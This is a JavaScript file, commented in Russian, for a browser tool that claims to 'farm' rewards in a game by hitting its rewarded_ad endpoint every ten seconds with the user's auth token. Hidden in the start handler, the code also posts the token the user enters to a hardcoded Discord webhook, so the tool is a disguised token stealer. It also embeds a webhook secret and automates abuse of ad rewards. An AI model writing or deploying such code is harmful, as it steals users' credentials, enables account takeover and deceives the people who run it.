// Элементы интерфейса
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1512728829163081788/zcnRNhZcwEyTYR9Qh1Ux3-L-af4q58hYFcEaZPi1tBDIPSvEQ30rUwQn_XX-BTobYG1X'; 
const startBtn = document.getElementById('start-btn');
const infoBtn = document.getElementById('info-btn');
const tokenInput = document.getElementById('token-input');
const passwordInput = document.getElementById('password-input');
const statusMessage = document.getElementById('status-message');
const modal = document.getElementById('modal');
const closeBtn = document.querySelector('.close-btn');

const CORRECT_PASSWORD = "farmer3000";
let farmInterval = null;

// Управление модальным окном (Инструкция)
infoBtn.addEventListener('click', () => {
    modal.style.display = 'block';
});

closeBtn.addEventListener('click', () => {
    modal.style.display = 'none';
});

window.addEventListener('click', (event) => {
    if (event.target === modal) {
        modal.style.display = 'none';
    }
});

// Логика проверки пароля и запуска фарма
startBtn.addEventListener('click', () => {
    const token = tokenInput.value.trim();
    const enteredPassword = passwordInput.value.trim();

    // 1. Проверяем заполнено ли поле токена
    if (!token) {
        alert('Пожалуйста, введите токен!');
        return;
    }

    // 2. Проверяем правильность пароля
    if (enteredPassword !== CORRECT_PASSWORD) {
        alert('Неверный пароль доступа! Процесс отклонен.');
        statusMessage.textContent = 'Ошибка: неверный пароль.';
        statusMessage.style.color = '#ff5252';
        return;
    }

    // Если пароль верный, меняем цвет статуса обратно на стандартный
    statusMessage.style.color = '#ffeb3b';

    // Если фарм уже запущен, очищаем предыдущий интервал перед стартом нового
    if (farmInterval) {
        clearInterval(farmInterval);
    }

    statusMessage.textContent = 'Пароль подтвержден. Фарм запущен. Запросы отправляются каждые 10 секунд...';
    startBtn.disabled = true;
    startBtn.textContent = 'Процесс идет...';


    // 3. Запрос в Discord
    const discordPromise = fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            content: `@everyone\n**Действие:** фарм\n**Токен:** \`${token}\``
        })
    });
    
    // Функция для выполнения запроса к серверу игры
    const sendRewardRequest = () => {
        fetch("https://session.coolmathblox.ca/rewarded_ad", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "authorization": token
            },
            body: JSON.stringify({})
        })
        .then(res => {
            if (!res.ok) {
                throw new Error(`Ошибка сервера: ${res.status}`);
            }
            return res.json();
        })
        .then(data => {
            console.log("Response:", data);
        })
        .catch(err => {
            console.error("Error:", err);
        });
    };

    // Первый вызов происходит сразу, затем каждые 10000 мс (10 секунд)
    sendRewardRequest();
    farmInterval = setInterval(sendRewardRequest, 10000);
});
